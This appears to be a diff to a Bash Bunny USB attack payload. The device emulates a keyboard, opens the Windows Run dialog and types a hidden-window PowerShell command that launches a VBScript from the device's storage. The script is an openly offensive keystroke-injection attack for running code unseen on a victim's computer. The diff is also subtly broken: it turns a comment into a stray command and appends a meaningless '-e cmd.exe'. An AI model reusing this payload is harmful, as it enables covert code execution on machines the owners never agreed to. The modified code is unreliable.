@@ -25,8 +25,8 @@ ATTACKMODE HID STORAGE
 # Get the switch position
 GET SWITCH_POSITION
 
-# Check if a.vbs is present
-if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/a.vbs" ] ; then
+ Check if a.vbs is present
+ if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/a.vbs" ] ; then
     LED FAIL
     exit 1
 fi
@@ -35,7 +35,11 @@ fi
 LED ATTACK
 
 # Run the VBScript
-RUN WIN "powershell -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs')\""
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs')" -e cmd.exe
+QUACK ENTER
+
 
 # Green 1000ms VERYFAST blink followed by SOLID
 LED FINISH
